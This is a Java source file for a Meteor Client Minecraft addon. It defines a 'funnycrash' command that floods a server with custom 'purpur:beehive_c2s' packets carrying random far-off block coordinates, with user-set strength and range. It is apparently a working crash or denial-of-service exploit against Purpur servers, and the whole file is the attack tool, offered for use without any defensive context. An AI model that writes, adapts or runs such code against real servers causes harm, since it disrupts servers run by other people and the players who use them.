package addon.antip2w.commands;

import com.mojang.brigadier.arguments.IntegerArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.context.CommandContext;
import meteordevelopment.meteorclient.commands.Command;
import meteordevelopment.meteorclient.utils.player.ChatUtils;
import net.minecraft.client.MinecraftClient;
import net.minecraft.command.CommandSource;
import net.minecraft.network.PacketByteBuf;
import net.minecraft.network.packet.CustomPayload;
import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;
import net.minecraft.util.Identifier;
import net.minecraft.util.math.BlockPos;

public class FunnyCrash extends Command {
    public FunnyCrash() {
        super("funnycrash", "funny crash");
    }

    private static int run(CommandContext<CommandSource> ctx, boolean rangeSpecified) {
        int packets = IntegerArgumentType.getInteger(ctx, "strength");
        ChatUtils.info("sending funny with strength " + packets);
        int range = rangeSpecified ? IntegerArgumentType.getInteger(ctx, "range") * 2 : 60_000_000;
        for (int i = 0; i < packets; i++) {
            int x = (int) ((Math.random() - 0.5) * range);
            int y = (int) ((Math.random() - 0.5) * range);
            if (MinecraftClient.getInstance().getNetworkHandler() != null) {
                MinecraftClient.getInstance().getNetworkHandler().sendPacket(new CustomPayloadC2SPacket(new CustomPayload() {
                    @Override
                    public void write(PacketByteBuf buf) {
                        long l = new BlockPos(x, (int) (Math.random() * 4 + 250), y).asLong();
                        buf.writeLong(l);
                    }

                    @Override
                    public Identifier id() {
                        return new Identifier("purpur", "beehive_c2s");
                    }
                }));
            }
        }
        return com.mojang.brigadier.Command.SINGLE_SUCCESS;
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> builder) {
        builder.then(
            argument("strength", IntegerArgumentType.integer(1))
                .executes(ctx -> run(ctx, false))
                .then(
                    argument("range", IntegerArgumentType.integer(500, 30_000_000))
                        .executes(ctx -> run(ctx, true))
                )
        );
    }
}
